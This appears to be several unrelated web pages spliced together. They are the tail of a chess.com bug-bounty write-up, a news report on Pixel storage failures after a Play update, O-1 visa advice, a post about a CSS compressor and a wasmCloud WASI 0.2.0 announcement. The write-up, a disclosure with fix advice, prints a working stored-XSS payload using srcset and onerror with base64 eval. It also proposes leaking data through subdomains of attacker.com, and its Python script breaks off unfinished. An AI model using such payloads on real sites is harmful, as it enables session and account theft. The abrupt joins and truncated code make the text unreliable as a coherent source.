<code>background-image</code> style that immediately closes the attribute with the URL leftover to be added as unfiltered attributes. What if we move the <code>url()</code> part to another, more direct attribute like <code>srcset</code> instead of using it in style? It'd be a long shot, but it might be treated slightly differently and thus let us use more symbols for a broader syntax of JS, leading to full XSS! Here's what I came up with:</p><pre><code>&lt;p&gt;&lt;img src="a.png" style="display: block; margin: 0 auto;" srcset=url(https://images.chesscomfiles.com/onerror=eval(atob("YWxlcnQoMSk=)));2+4//&gt;&lt;/p&gt;</code></pre><p>As you can see, this doesn't require a <code>?</code> to be used, and the <code>(</code>, <code>"</code> symbols are not encoded, meaning we can base64 any payload and directly execute that! Whoo! </p><figure><img src="https://skii.dev/content/images/2024/01/image-16.png" alt="" loading="lazy" width="454" height="156"></figure><p>To top it all off, I quickly learned that the TinyMCE rich text editor system was used not only in your profile's <code>About Me</code> page but practically everywhere on the site, including comments in forums and blogs! This had a significant impact because thousands of users used the comments and blogs daily. </p><p>I hope you enjoyed reading this as much as I did finding this intriguing bug! In the end, it turned out that the ability for XSS was already known (this is pretty common in bug bounties). Still, my initial vector through the background-image attribute was not known to them, and they thoroughly enjoyed reading my detailed report, offering me a bonus reward for it.</p><div data-kg-toggle-state="close">
            <div>
                <h4><span>Aside: How I accidentally triggered blind XSS</span></h4>
                </div>
            <div><p><span>During communication with the triage team at chess.com about the initial OSRF vulnerability, they asked me how I managed to execute XSS (an alert had popped up while viewing my profile) - I was confused because, at that time, I couldn't get any injection possible and had no idea where they got that from. Maybe it was another hacker who also got fed up with losing!</span></p><p><span>It turned out that when viewing my profile, the staff team could roll back previous versions to view - loading these previous versions did not filter out malicious HTML from my input. Thus, when I was trying for XSS, the malicious payload was saved as an earlier version and executed as soon as the staff member viewied it!</span></p></div>
        </div><hr><p>The root issue behind these vulnerabilities is the re-uploading image function. Firstly, its checking system to see if the image was hosted on chess.com can easily be tricked by including chess.com in the domain name. Instead, it should check if the <strong>root </strong>domain is equal to <code>chess.com</code> or, even better, re-upload the image to its posting CDN no matter what the source is.</p><p>Rich text editors are a gold mine for achieving XSS because they allow different HTML elements for a more stylish appearance. Instead of accepting input and treating it only <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html?ref=skii.dev#safe-sinks" rel="noreferrer">as text</a>, it has to get raw HTML and directly embed it - this is why configuring allow-lists for what elements &amp; attributes can be taken is so important, as well as ensuring the RTE is always up-to-date. </p><p>However, in this case, TinyMCE was up-to-date and had been configured correctly not to allow scripting tags and attributes. The problem was that when we inputted the code for our profile, it firstly sanitised it (good), but it did this before it ran extra code on it, such as the re-uploading function - this led to the final HTML being completely different and not going through sanitisation to recheck it. </p><p>If <code>chess.com</code> wants to keep RTE, it should ensure that the sanitisation is run directly on the final HTML shown to the user. Even though the HTML modification was caused by the re-uploading function modifying the URL, and <em>technically </em>fixing that would stop this specific attack vector, another function may do something similar. Hence, it's essential to fix the sanitisation directly! (Defense in depth)</p><p>Finally, here are some extra details about the findings:</p><ol><li>If you're wondering why I didn't just use <code>friend.chess.com</code> directly for the OSRF exploit, during my testing of this, chess.com changed something to do with how it functioned, and I could only get <code>chess.com/registration-invite</code> to work...</li><li>Google did not like me setting up a <code>chess.com</code> subdomain, and a couple of weeks later, my domain got flagged for "phishing." - I had to contact them to explain and manually remove it as it affected my whole domain. </li><li>During the data extraction stage, where I couldn't exfil the data as a parameter, I realised I could have instead set the data as a subdomain like <code>http:sensitivedata.attacker.com</code> . This is possible using a multi-level wildcard (catch-all) DNS system with something like a Cloudflare worker to log the subdomain requested. This, however, would be more complicated to set up, and I haven't dug too deep into it.</li><li>Alternatively, instead of using Burp to intercept and send the raw data in the <code>About</code> section rich text editor, you could also manually send the POST request using a scripting language like <code>Python</code></li></ol><pre><code>import requests, os
import urllib3

cookies = {
    xxxxx

headers = {
    xxxxxx

<div id="readability-page-1" class="page"><div>
<p><img alt="Google Pixel 7" height="900" src="https://www.bleepstatic.com/content/hl-images/2024/01/24/google-pixel-7.jpg" width="1600"></p>
<p>Google Pixel smartphone&nbsp;owners report problems after installing the January 2024 Google Play system update, being unable to access their devices internal storage, open the camera, take screenshots, or even open apps.</p>
<p>The issue is being&nbsp;<a href="https://www.reddit.com/r/GooglePixel/comments/19c14at/upixelcommunity_please_help_internal_storage/" target="_blank" rel="nofollow noopener">reported</a>&nbsp;by owners of numerous Pixel models, including the Google Pixel 5, 6, 6a, 7, 7a, 8, and 8 Pro, suggesting that it isn't confined to a particular hardware architecture.</p>
<p>The root cause is unknown but is likely a software issue with the January 2024 Play system update that Google hasn't pinpointed or fixed yet.</p>
<p>Most proposed solutions coming from affected users don't address the problem, with some reporting solving it by performing a factory reset, in which case, all data is lost.</p>
<p>However, these recommendations are coming from impacted Google Pixel owners rather than Google themselves, who&nbsp;<a href="http://www.reddit.com/r/GooglePixel/comments/19c14at/comment/kj83bb0/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3" target="_blank" rel="nofollow noopener">simply acknowledged</a>&nbsp;they are aware of and looking into the issue.</p>
<p>"I wonder why this is not something that's getting blown up forcing Google for a fix. Spending so much money on a phone just to be made unusable by an update is very aggravating,"&nbsp;<a href="http://support.google.com/pixelphone/thread/254021673?hl=en&amp;msgid=254925930" target="_blank" rel="nofollow noopener">an affected owner posted</a>&nbsp;in Google's Pixel Phone support forums.</p>
<p>Google Play system updates are separate from the monthly security patches, both accessible via Settings &gt; Security &amp; privacy &gt; System &amp; updates.</p>
<p><img alt="Update menu" height="600" src="https://www.bleepstatic.com/images/news/u/1220909/2024/Android/play-update.png" width="360"></p>
<p>Google introduced Play system updates in Android 10 as a way to deliver crucial security updates and system component enhancements and protections in devices not running the latest patch level and those that have reached the end of support by the OEM.</p>
<p>They are served directly by Google, bypassing the OEM update channels, and are effective in keeping older Android versions compatible with modern apps and Google services, and also relatively safe.</p>
<p>In the case of Pixels, it appears that Google performed a staged roll-out of the January 2024 Play system updates, so not every Pixel owner has received the problematic update yet.</p>
<p>If you are still on an older update (last was November 1, 2023), it is recommended to stay on it and postpone applying the January 2024 update until the situation clears up.</p>
<p>BleepingComputer has contacted Google for a comment on the reported problems and their plans to address them, and a member of the firm's press team has sent us the following:</p>
<blockquote>
<p>We are aware of this issue, and are looking into it. - Google</p>
</blockquote>
<h2>Same thing happened a few months back</h2>
<p>Although the nature of the current problem has not been confirmed yet, memory bugs introduced by a Play system update previously rendered Pixel devices completely unusable in October 2023.</p>
<p>Google eventually&nbsp;<a href="https://support.google.com/pixelphone/thread/241474288/issues-accessing-storage-after-updating-to-android-14?hl=en&amp;sjid=15384693003212063525-EU" target="_blank" rel="nofollow noopener">addressed</a>&nbsp;the media storage access and repeated rebooting problems by releasing an update on November 7, 2023. However, by then, many users had already resorted to performing a factory reset, losing their data as a result.</p>
<p>The recurrence of this type of issue in such a short timeframe is quite concerning for Pixel device users, who cannot use the features of their phones.</p>
<p>The situation undermines the trust in Google's quality assurance processes and raises concerns about the rigor of the tech giant's validation and testing protocols before deploying a system update.</p>

I met the 4 criteria which are highlighted in <strong>bold (*)</strong> below.</p><ul><li><strong>Nationally or internationally recognized awards (*)</strong></li><li>Membership in organizations which require outstanding achievement</li><li>Published material in journals, trade publications or major media about the applicant</li><li>Has judged the work of others (e.g. peer-review, or judging hackathons)</li><li><strong>Evidence of original contributions in science, scholarship, or business (*)</strong></li><li>Has authored / published articles in professional journals, or major media</li><li><strong>Has been employed in a ‘critical capacity’ at an organization with a distinguished reputation (*)</strong></li><li><strong>Evidence that the beneficiary has commanded a high salary (*)</strong></li></ul><p>Below are more details on how I met each of the criteria. In general, for every claim made in your O-1 cover letter, you should be able to produce documentary evidence, or a statement in a signed letter from a credible person.</p><p><strong>Nationally or internationally recognized awards</strong></p><p>Startup funding counts as an award, if you can demonstrate that the investor(s) were being judicious in their investment. In other words, you must demonstrate that your investors only select a small percentage of the opportunities presented to them.</p><p>At the time of my application, my company had raised $98,000 on SAFEs from friends, family and angel investors. Alongside copies of all the signed SAFEs (demonstrating total funding amount), we submitted our pitch deck, and letters + CVs from two investors showing their credibility as discerning / selective individuals.</p><p><strong>Evidence of original contributions in science, scholarship, or business</strong></p><p>I did not have to do any additional work, beyond the day-to-day work I had done at Wave in order to meet this criterion.</p><p>While at Wave, I worked on several projects that were original in the industry, primarily because Wave had unique constraints as a fintech targeting sub-Saharan Africa. It helped that I had previously met the L1-B criterion for “specialized knowledge” and we were able to make a similar argument here that I had worked on original, proprietary software at Wave.</p><p>As evidence, we included my employment contract, letters from the CTO and a cofounder of Wave, and press coverage showing <a href="https://techcrunch.com/2021/09/06/sequoia-heritage-stripe-and-others-invest-200m-in-african-fintech-wave-at-1-7b-valuation/?ref=blog.awais.io"><u>Wave’s success in Africa</u></a>. We also included material from a conference talk I gave at PyCon Africa in June 2019.</p><p><strong>Being employed in a ‘critical capacity’ at an organization with a distinguished reputation</strong></p><p>It’s important for this criterion to show both <em>critical capacity</em>, and <em>distinguished reputation</em>. My lawyer made the argument that I met this criteria both for my work at Path, and my work at Wave.</p><p>At the new startup, Path, it was easy to show critical capacity since I was a founder, large shareholder, and board member, as evidenced by our incorporation documents. To demonstrate distinguished reputation, we showed that Path had raised nearly $100,000 in funding, and that Path had been accepted into a legal tech sandbox program.</p><p>To demonstrate critical capacity at Wave, we used the same two letters: one from Wave’s CTO and one from Wave’s cofounder showing that I was an early employee and had worked on key projects which contributed significantly to Wave’s success. To show distinguished reputation we submitted media coverage about Wave’s impressive <a href="https://randle.substack.com/p/wave?ref=blog.awais.io"><u>$200m Series A fundraise</u></a>.</p><p><strong>Evidence that the beneficiary has commanded a high salary or remuneration</strong></p><p>Equity grants in startups count towards this requirement.</p><blockquote><em>“if the petitioner demonstrates that receipt of a high salary is not readily applicable to the beneficiary’s position as an entrepreneur, the petitioner might present evidence that the beneficiary’s highly valued equity holdings in the startup are of comparable significance to the high salary criterion.”<br>- </em><a href="https://www.uscis.gov/policy-manual/volume-2-part-m-chapter-4?ref=blog.awais.io#S-C-3"><em><u>USCIS Policy Manual. Volume 2, Part M, Chapter 5, Section 3</u></em></a></blockquote><p>I showed that my total compensation (base salary + equity) at Wave for the 2021 calendar year was higher than the top 10th percentile for software engineers in New York City as recorded by the <a href="https://www.bls.gov/oes/current/oes151252.htm?ref=blog.awais.io"><u>US Bureau of Labor Statistics</u></a> benchmark, and the <a href="https://www.careeronestop.org/Toolkit/Wages/find-salary.aspx?keyword=Software+Developers&amp;soccode=151252&amp;location=New+York&amp;keywordSearched=Software+Developers&amp;ref=blog.awais.io"><u>Career One Stop</u></a> website.</p><p>I benefited from the frothy investment market of 2021. The stock options I was granted at Wave were issued before Wave raised money at a $1.7B valuation, so they were worth a lot on paper at the time of my O-1 application. As documentary evidence, we submitted copies of my Wave stock certificates, and 12 months of paystubs.</p><p><em>Note: you can meet this criteria by commanding a high salary at any point in the past, it doesn’t have to be your most recent year of earnings.</em></p><h2 id="how-much-does-it-cost"><strong>How much does it cost?</strong></h2><p>The O-1 filing fees were $460, with an additional $2,500 for premium processing. (Note: the premium processing fee is set to increase to $2,805 on February 26th 2024).</p><p>I was quoted in the $6k-$10k range for immigration lawyer fees (not including filing fees).</p><h2 id="should-you-work-with-a-lawyer"><strong>Should you work with a lawyer?</strong></h2><p>I would definitely recommend working with an immigration lawyer, especially if you are not <em>very</em> familiar with the US immigration system.

<div id="readability-page-1" class="page"><div><h2 id="what">What</h2><p>Late last year, I had an idea that’s been steadily brewing in my head. I’ve found myself with some free time recently (it coincided with vacation, go figure), and I’ve hacked together some proof-of-concept code. Whether or not it is actually proving the concept I’m not sure, but the results are somewhat interesting, and I believe the idea is novel (I haven’t found any other implementation in the wild). So it’s at least worthy of a blog post.</p><p>I wrote <code>cssfact</code>, a lossy CSS compressor. That is, a program that takes some CSS and outputs back some other CSS that hopefully retains some (most) of the information in the input, but contains fewer rules than the original. Exactly how many rules it produces is configurable, and the loss depends on that number.</p><p>The program only works on style rules (which make up the majority of a typical CSS). It leaves the non-style rules unchanged.</p><p><a href="https://github.com/nathell/cssfact">Here’s the source</a>. It’s not exactly straightforward to get it running, but it shouldn’t be very hard, either. It’s very simple – the program itself doesn’t contain any fancy logic; the actual decisions on what the output will contain are made by an external program.</p><p>If you just want to see some results, here is a sample with <a href="https://danieljanus.pl/">my homepage</a> serving as a patient etherized upon a table. Its CSS is quite small – 55 style rules that cssfact can work on – and here’s how the page looks with various settings:</p><ul><li><span>Original: <a href="https://danieljanus.pl/">page</a>, <a href="https://danieljanus.pl/css/nhp.css">CSS</a>, <a href="https://github.com/nathell/nhp/blob/master/src/sass/nhp.sass">source SASS</a></span></li><li><span>1 style rule: <a href="https://danieljanus.pl/index1.html">page</a>, <a href="https://danieljanus.pl/css/nhp1.css">CSS</a> (93% information loss)</span></li><li><span>5 style rules: <a href="https://danieljanus.pl/index5.html">page</a>, <a href="https://danieljanus.pl/css/nhp5.css">CSS</a> (74% information loss)</span></li><li><span>10 style rules: <a href="https://danieljanus.pl/index10.html">page</a>, <a href="https://danieljanus.pl/css/nhp10.css">CSS</a> (55% information loss)</span></li><li><span>20 style rules: <a href="https://danieljanus.pl/index20.html">page</a>, <a href="https://danieljanus.pl/css/nhp20.css">CSS</a> (31% information loss)</span></li><li><span>30 style rules: <a href="https://danieljanus.pl/index30.html">page</a>, <a href="https://danieljanus.pl/css/nhp30.css">CSS</a> (17% information loss)</span></li></ul><p>My homepage and both of my blogs all use the same CSS, so you can try to replace the CSS in your browser’s devtools elsewhere on the site and see how it looks.</p><h2 id="how">How</h2><p>Three words: <a href="https://cs.uef.fi/~pauli/bmf_tutorial/material.html">binary matrix factorization</a> (BMF, in the Boolean algebra).</p><p>I guess I could just stop here, but I’ll elaborate just in case it isn’t clear.</p><p>Consider a simple CSS snippet:</p><pre><code><span>h1</span>, <span>h2</span> {
   <span>padding</span>: <span>0</span>;
   <span>margin-bottom</span>: <span>0.5em</span>;
}

<span>h1</span> {
   <span>font-size</span>: <span>32px</span>;
   <span>font-weight</span>: bold;
}

<span>h2</span> {
   <span>font-size</span>: <span>24px</span>;
   <span>font-weight</span>: bold;
}
</code></pre><p>The first rule tells you that for all elements that match either the <code>h1</code> or <code>h2</code> selectors, the two declarations should apply.</p><p>You could visualize this CSS as a 5x2 binary matrix <i>A<sup>T</sup></i> where the <em>n</em> columns correspond to simple selectors (i.e., without commas in them) and the <em>m</em> rows correspond to declarations:</p>
<table>
        <tbody><tr><th></th><th><code>h1</code></th><th><code>h2</code></th></tr>
        <tr><th><code>padding: 0</code></th><td>1</td><td>1</td></tr>
        <tr><th><code>margin-bottom: 0.5em</code></th><td>1</td><td>1</td></tr>
        <tr><th><code>font-size: 32px</code></th><td>1</td><td>0</td></tr>
        <tr><th><code>font-size: 24px</code></th><td>0</td><td>1</td></tr>
        <tr><th><code>font-weight: bold</code></th><td>1</td><td>1</td></tr>
    </tbody>
</table>
<p>You could also transpose the matrix, yielding <em>A</em> with <em>m</em> rows denoting selectors and <em>n</em> columns denoting declarations. For my homepage’s CSS, <em>m</em> = 60 and <em>n</em> = 81; for bigger stylesheets, several thousand in either direction is not uncommon.</p><p>Now, linear algebra gives us algorithms to find a matrix <em>A′ ≈ A</em> such that there exists a decomposition <em>A′ = B × C</em>, where <em>B</em> has dimensions <em>m × r</em>, <em>C</em> has dimensions <em>r × n</em>, and <em>r</em> is small – typically much smaller than <em>m</em> or <em>n</em>. So this is a way of dimensionality reduction.</p><p>In the usual algebra of real numbers, there’s no guarantee that <em>B</em> or <em>C</em> will themselves be binary matrices – in fact, most likely they won’t. But if we operate in Boolean algebra instead (i.e. one where 1 + 1 = 1), then both <em>B</em> and <em>C</em> will be binary. The flip side is that the Boolean BMF problem is NP-hard, so the algorithms found in the wild perform approximate decompositions, not guaranteed to be optimal.</p><p>But that’s okay, because lossiness is inherent in what we’re doing anyway, and it turns the binary matrices <em>B</em> and <em>C</em> are readily interpretable. Look again at the CSS matrix above: why is there a 1 in the top-left cell? Because at least one of the CSS rules stipulates the declaration <code>padding: 0</code> for the selector <code>h1</code>.</p><p>This is exactly the definition of matrix multiplication in the Boolean algebra. The matrix <em>A′</em> will have a 1 at coordinates [<em>i, j</em>] iff there is at least one <em>k</em> ∈ {1, …, <em>r</em>} such that <em>B</em>[<em>i</em>, <em>k</em>] = 1 and <em>C</em>[<em>k</em>, <em>j</em>] = 1. So the columns of <em>B</em> and rows of <em>C</em> actually correspond to CSS rules! Every time you write CSS, you’re actually writing out binary matrices – and the browser is multiplying them to get at the actual behaviour.</p><p>Well, not really, but it’s one way to think about it. It’s not perfect – it completely glosses over rules overlapping each other and having precedence, and treats them as equally important – but it somewhat works!</p><p>You could plug in any BMF algorithm to this approach. For cssfact, I’ve picked the code by <a href="https://github.com/IBM/binary-matrix-factorization/">Barahona and Goncalves 2019</a> – sadly, I wasn’t able to find the actual paper – not because it performs spectacularly well (it’s actually dog-slow on larger stylesheets), but because I was easily able to make it work and interface with it.</p><h2 id="why">Why</h2><p>Why not?</p><p>The sheer joy of exploration is reason enough, but I believe there are potential practical applications. CSS codebases have the tendency to grow organically and eventually start collapsing under their own weight, and they have to be maintained very thoughtfully to prevent that. In many CSS monstrosities found in the wild, there are much cleaner, leaner, essence-capturing cores struggling to get out.</p><p>This tool probably won’t automatically extract them for you – so don’t put it in your CI pipeline – but by perusing the CSS that it produces and cross-checking it with the input, you could encounter hints on what redundancy there is in your styles. Things like “these components are actually very similar, so maybe should be united” may become more apparent.</p></div></div>]]></description>

<div id="readability-page-1" class="page"><div id="__blog-post-container" itemprop="articleBody"><p><img loading="lazy" alt="stable foundation and community" src="https://wasmcloud.com/assets/images/stable-foundation-c2f80e43b4d8ae40b2d7e625453e70cd.png" width="1792" height="1024"></p>
<p><a href="https://github.com/WebAssembly/WASI/pull/577" target="_blank" rel="noopener noreferrer">WASI Preview 2 officially launched!</a> After a vote in the WASI Subgroup of the W3C WebAssembly Community Group, the standard set of interfaces included in the launch of Preview 2, aka WASI 0.2.0, is ready for use by library implementers. We've been closely tracking the different release candidates of WASI 0.2.0 over the last 6 months, and wasmCloud will update its runtime WIT definitions to the pinned versions in just a few days.</p>
<!-- -->
<p>If you look in our <a href="https://wasmcloud.com/docs/tour/hello-world" target="_blank" rel="noopener noreferrer">quickstart</a> now you'll notice that we now provide documentation for building WebAssembly components, starting with Rust and TinyGo. As seen in previous <a href="https://wasmcloud.com/community" target="_blank" rel="noopener noreferrer">community calls</a>, JavaScript and Python are also supported thanks to the <a href="https://github.com/bytecodealliance/componentizejs/" target="_blank" rel="noopener noreferrer">ComponentizeJS</a> and <a href="https://github.com/bytecodealliance/componentize-py" target="_blank" rel="noopener noreferrer">componentize-py</a> projects. I worked on getting examples up-and-running for components, and there are upsides and downsides to the initial approach we're taking. This post will focus on what current component support looks like and what WASI 0.2.0 means for wasmCloud.</p>

<p>A WebAssembly component is a reactive unit of compute that has to be loaded, instantiated, and then a function that the component <strong>export</strong>s needs to be <strong>import</strong>ed by the host runtime. Like so many applications, the entrypoint for many of our examples is an HTTP endpoint as it provides a common abstraction that's easy to work with and test using <code>curl</code> on the CLI.</p>
<p>The simplest “hello world” example looks like this using the <code>wasi:http</code> interface:</p>
<div><pre tabindex="0"><code><span><span># </span><span>Rust</span><span></span><br></span><span><span></span><span>wit_bindgen</span><span>::</span><span>generate!</span><span>(</span><span>{</span><span></span><br></span><span><span>    world</span><span>:</span><span> </span><span>"hello"</span><span>,</span><span></span><br></span><span><span>    exports</span><span>:</span><span> </span><span>{</span><span></span><br></span><span><span>        </span><span>"wasi:http/incoming-handler"</span><span>:</span><span> </span><span>HttpServer</span><span>,</span><span></span><br></span><span><span>    </span><span>}</span><span>,</span><span></span><br></span><span><span></span><span>}</span><span>)</span><span>;</span><span></span><br></span><span><span></span><br></span><span><span></span><span>use</span><span> </span><span>exports</span><span>::</span><span>wasi</span><span>::</span><span>http</span><span>::</span><span>incoming_handler</span><span>::</span><span>Guest</span><span>;</span><span></span><br></span><span><span></span><span>use</span><span> </span><span>wasi</span><span>::</span><span>http</span><span>::</span><span>types</span><span>::</span><span>*</span><span>;</span><span></span><br></span><span><span></span><br></span><span><span></span><span>struct</span><span> </span><span>HttpServer</span><span>;</span><span></span><br></span><span><span></span><br></span><span><span></span><span>impl</span><span> </span><span>Guest</span><span> </span><span>for</span><span> </span><span>HttpServer</span><span> </span><span>{</span><span></span><br></span><span><span>    </span><span>fn</span><span> </span><span>handle</span><span>(</span><span>_request</span><span>:</span><span> </span><span>IncomingRequest</span><span>,</span><span> response_out</span><span>:</span><span> </span><span>ResponseOutparam</span><span>)</span><span> </span><span>{</span><span></span><br></span><span><span>        </span><span>let</span><span> response </span><span>=</span><span> </span><span>OutgoingResponse</span><span>::</span><span>new</span><span>(</span><span>Fields</span><span>::</span><span>new</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span><br></span><span><span>        response</span><span>.</span><span>set_status_code</span><span>(</span><span>200</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span>        </span><span>let</span><span> response_body </span><span>=</span><span> response</span><span>.</span><span>body</span><span>(</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span>        response_body</span><br></span><span><span>            </span><span>.</span><span>write</span><span>(</span><span>)</span><span></span><br></span><span><span>            </span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span></span><br></span><span><span>            </span><span>.</span><span>blocking_write_and_flush</span><span>(</span><span>b"Hello from Rust!\n"</span><span>)</span><span></span><br></span><span><span>            </span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span>        </span><span>OutgoingBody</span><span>::</span><span>finish</span><span>(</span><span>response_body</span><span>,</span><span> </span><span>None</span><span>)</span><span>.</span><span>expect</span><span>(</span><span>"failed to finish response body"</span><span>)</span><span>;</span><span></span><br></span><span><span>        </span><span>ResponseOutparam</span><span>::</span><span>set</span><span>(</span><span>response_out</span><span>,</span><span> </span><span>Ok</span><span>(</span><span>response</span><span>)</span><span>)</span><span>;</span><span></span><br></span><span><span>    </span><span>}</span><span></span><br></span><span><span></span><span>}</span><br></span></code></pre></div>
<p>In our <code>Cargo.toml</code>, the only dependency here is <code>wit-bindgen</code> to generate the Rust types for us to refer to from <code>wasi::http::*</code>. This is lower level than the Smithy module abstraction, which provides a simple model of receiving an HTTP request struct and returning a response struct:</p>
<div><pre tabindex="0"><code><span><span>async</span><span> </span><span>fn</span><span> </span><span>handle_request</span><span>(</span><span>&amp;</span><span>self</span><span>,</span><span> _ctx</span><span>:</span><span> </span><span>&amp;</span><span>Context</span><span>,</span><span> _req</span><span>:</span><span> </span><span>&amp;</span><span>HttpRequest</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>RpcResult</span><span>&lt;</span><span>HttpResponse</span><span>&gt;</span><span> </span><span>{</span><span></span><br></span><span><span>    </span><span>Ok</span><span>(</span><span>HttpResponse</span><span>::</span><span>ok</span><span>(</span><span>"Hello, World!"</span><span>)</span><span>)</span><span></span><br></span><span><span></span><span>}</span><br></span></code></pre></div>
<p>At this point, looking at the above examples, you may consider the component experience to be more WebAssembly-specific than code you'd ideally like to write. This is true, as the base level of support for Wasm components starts with using the <code>wit-bindgen</code> generated types and functions to implement business logic. So, what's the path forward?</p>
<h2 id="why-wasi-020-is-important">Why WASI 0.2.0 is Important<a href="#why-wasi-020-is-important" aria-label="Direct link to Why WASI 0.2.0 is Important" title="Direct link to Why WASI 0.2.0 is Important">​</a></h2>
<p>Working with the standard set of WASI interfaces isn't meant for application developers. They are fundamentally lower levels of abstraction meant for library developers and implementers. WASI 0.2.0 is important not because it gives application developers the ability to write real things with WebAssembly (we've been doing that for four years!), but because it provides a stable definition of common interfaces for library developers in each language to build on top of.</p>
<p>Taking the example above, we're not working towards a world where developers need to work with WebAssembly interfaces, we're working towards a world where the capabilities of standard libraries of language ecosystems will support WASI interfaces. Developers using language standard libraries and popular libraries will likely not code directly to WASI API's and will instead use idiomatic abstractions. As WASI grows on the 0.2 foundation, higher-level interfaces like wasi-keyvalue may be at the forefront. Let me show you an example of the ideal Wasm hello world application to tie what I'm saying together in a concrete way:</p>
<div><pre tabindex="0"><code><span><span>#[macro_use]</span><span> </span><span>extern</span><span> </span><span>crate</span><span> </span><span>rocket</span><span>;</span><span></span><br></span><span><span></span><br></span><span><span></span><span>#[get(</span><span>"/hello/&lt;name&gt;"</span><span>)]</span><span></span><br></span><span><span></span><span>fn</span><span> </span><span>hello</span><span>(</span><span>name</span><span>:</span><span> </span><span>&amp;</span><span>str</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>String</span><span> </span><span>{</span><span></span><br></span><span><span>    </span><span>format!</span><span>(</span><span>"Hello, {name}!"</span><span>)</span><span></span><br></span><span><span></span><span>}</span><span></span><br></span><span><span></span><br></span><span><span></span><span>#[launch]</span><span></span><br></span><span><span></span><span>fn</span><span> </span><span>rocket</span><span>(</span><span>)</span><span> </span><span>-&gt;</span><span> _ </span><span>{</span><span></span><br></span><span><span>    </span><span>rocket</span><span>::</span><span>build</span><span>(</span><span>)</span><span>.</span><span>mount</span><span>(</span><span>"/"</span><span>,</span><span> </span><span>routes!</span><span>[</span><span>hello</span><span>]</span><span>)</span><span></span><br></span><span><span></span><span>}</span><br></span></code></pre></div>
<p>Note that there are no Wasm interfaces here! This is actually copy/pasted from the <a href="https://rocket.rs/v0.4/" target="_blank" rel="noopener noreferrer">Rocket homepage</a>. The ideal experience is that developers can use idiomatic community and standard libraries to write their code, then simply compile to a Wasm binary. We're not quite at this point yet, but WASI 0.2.0 is the first step in this direction because it provides a common standard set of interfaces for library developers to build on top of.</p>

<p>If you take a look at our <a href="https://github.com/wasmCloud/wasmCloud/tree/main/examples" target="_blank" rel="noopener noreferrer">examples in the wasmCloud/wasmCloud repository</a> you'll see we've added Rust, TinyGo and TypeScript/JavaScript examples, with Python coming soon. The above snippet of code, where a developer can use just a language library out-of-the-box and compile to WASI, is likely a few months away. The important thing to keep in mind is that WASI 0.2.0 enables this in the first place and, looking forward, here's what you can expect from the wasmCloud developer experience.</p>
<p>As language toolchains evolve to better and better support WASI, what you can expect to see is Wasm-first frameworks for developing applications using standard interfaces. One of these such frameworks will be the <a href="https://github.com/wasmCloud/wasmCloud/tree/main/crates/actor" target="_blank" rel="noopener noreferrer">wasmcloud-actor</a> crate, which will provide both access to a stable set of WASI interfaces and nicer abstractions around specific functionality. Take the above HTTP request handler code and how we respond with an HTTP response of “Hello from Rust”:</p>
<div><pre tabindex="0"><code><span><span>let</span><span> response </span><span>=</span><span> </span><span>OutgoingResponse</span><span>::</span><span>new</span><span>(</span><span>Fields</span><span>::</span><span>new</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span><br></span><span><span>response</span><span>.</span><span>set_status_code</span><span>(</span><span>200</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span></span><span>let</span><span> response_body </span><span>=</span><span> response</span><span>.</span><span>body</span><span>(</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span>response_body</span><br></span><span><span>    </span><span>.</span><span>write</span><span>(</span><span>)</span><span></span><br></span><span><span>    </span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span></span><br></span><span><span>    </span><span>.</span><span>blocking_write_and_flush</span><span>(</span><span>b"Hello from Rust!\n"</span><span>)</span><span></span><br></span><span><span>    </span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span></span><span>OutgoingBody</span><span>::</span><span>finish</span><span>(</span><span>response_body</span><span>,</span><span> </span><span>None</span><span>)</span><span>.</span><span>expect</span><span>(</span><span>"failed to finish response body"</span><span>)</span><span>;</span><span></span><br></span><span><span></span><span>ResponseOutparam</span><span>::</span><span>set</span><span>(</span><span>response_out</span><span>,</span><span> </span><span>Ok</span><span>(</span><span>response</span><span>)</span><span>)</span><span>;</span><br></span></code></pre></div>
<p>The code I personally would want to write is something like the original abstraction. Avoiding modifying traits and the standard way to define exports, we may have an abstraction like:</p>

<p>Check it out! A much nicer abstraction around returning an HTTP request, and all we had to do was pull the generated WASI structures behind a more idiomatic API. The above is just sample code I wrote for this blog, so our actual implementation might be different at the end of the day (and even better). This should, however, gives a sense of how library developers will use WASI APIs when the target architecture is Wasm. Even better, the <code>wasmcloud-actor</code> crate will still work out-of-the-box with tools like <code>wasmtime-serve</code>, as there are zero wasmCloud specific APIs used. That being said, this kind of library belongs in an upstream location like the Bytecode Alliance or in the language itself, and this is an intermediate solution unless we see evidence that we should keep the library around for good.</p>
<p>We will see libraries emerge in each language that demonstrates good Wasm component support, and I expect to see something like this for Rust, TinyGo, Python, JavaScript, C/C++, and C# in the near future. We may even see this support built into the standard libraries of these languages. Go for, example, <a href="https://github.com/golang/go/issues/42372" target="_blank" rel="noopener noreferrer">just resurfaced support for the wasmexport directive</a>, enabling libraries like <code>net/http</code> to have WASI implementations.</p>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">​</a></h2>
<p>We are, arguably, reaching the most exciting period of the wasmCloud project to-date. The stabilization of WASI 0.2.0, alongside native support for components in wasmCloud, lets us support every Wasm component language that uses the same WIT definitions. Even as WASI proposals continue to evolve, we now have a stable base to adapt those interfaces to ensure future stability. I firmly believe that this enables the community to truly collaborate on furthering language support, and writing real applications with WebAssembly, and I look forward to being at the forefront of that.</p>
